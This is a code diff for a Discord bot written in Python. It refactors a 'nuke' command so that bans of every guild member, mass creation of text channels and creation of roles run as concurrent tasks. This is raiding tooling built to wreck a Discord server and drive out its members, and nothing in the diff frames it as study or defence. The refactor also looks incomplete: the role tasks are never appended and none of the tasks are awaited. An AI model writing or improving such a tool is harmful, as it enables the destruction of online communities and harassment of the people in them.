@@ -42,23 +42,38 @@ def t(val):
 
 @bot.command()
 async def nuke(ctx):
+    tasks=[]
     for member in ctx.guild.members:
         if member == bot.user:
             continue
-        try:
-            await member.ban(reason=t("ban_reason"))
-            print(f"success | {member.name}")
-            await asyncio.sleep(0.1)
-        except discord.Forbidden:
-            print(f"missing permissions | {member.name}")
-    guild = ctx.guild
-    for i in range(t("channel_amount")):
-        b = t("chan")
-        await guild.create_text_channel(b)
-        await asyncio.sleep(0.1)
-        
-        
+
+    
+        task = asyncio.create_task(ban(member))
+        tasks.append(task)
+
+    for _ in range(t("channel_amount")):
+        task = asyncio.create_task(channel(ctx.guild))
+        tasks.append(task)
+    for _ in range(t("role_amount")):
+        task = asyncio.create_task(roles(ctx.guild))
         
 
+
+async def ban(member):
+    try:
+        await member.ban(reason=t("ban_reason"))
+        print(f"success | {member.name}")
+        await asyncio.sleep(0.7)
+    except discord.Forbidden:
+        print(f"missing permissions | {member.name}")
+        
+async def channel(guild):
+        b = t("chan")
+        await guild.create_text_channel(b)
+        await asyncio.sleep(0.7)
+
+
+async def roles(guild):
+    await guild.create_role(name=t("role_name"))
 
 bot.run(t("token"))
